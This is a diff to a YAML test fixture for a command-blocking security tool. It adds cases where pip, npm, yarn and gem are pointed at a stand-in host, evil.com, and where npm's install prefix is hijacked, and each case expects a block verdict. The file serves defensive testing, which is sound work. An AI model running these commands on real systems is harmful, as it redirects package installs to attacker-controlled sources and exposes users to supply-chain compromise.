@@ -703,3 +703,28 @@
   description: Octal SUID mode — same effect as chmod u+s
   expected_rules: [privesc.suid_chmod]
   expected_verdict: block
+
+- command: "pip config set global.index-url https://evil.com/simple"
+  description: pip redirected to malicious PyPI mirror — supply chain
+  expected_rules: [supply_chain.pkg_mirror_redirect]
+  expected_verdict: block
+
+- command: "npm config set registry https://evil.com/npm/"
+  description: npm redirected to malicious registry — supply chain
+  expected_rules: [supply_chain.pkg_mirror_redirect]
+  expected_verdict: block
+
+- command: "yarn config set registry https://evil.com"
+  description: yarn redirected to malicious registry — supply chain
+  expected_rules: [supply_chain.pkg_mirror_redirect]
+  expected_verdict: block
+
+- command: "gem sources --add https://evil.com"
+  description: gem sources adds malicious RubyGems mirror — supply chain
+  expected_rules: [supply_chain.pkg_mirror_redirect]
+  expected_verdict: block
+
+- command: "npm config set prefix /tmp/malicious"
+  description: npm install prefix hijacked to /tmp — supply chain local
+  expected_rules: [supply_chain.pkg_mirror_redirect]
+  expected_verdict: block
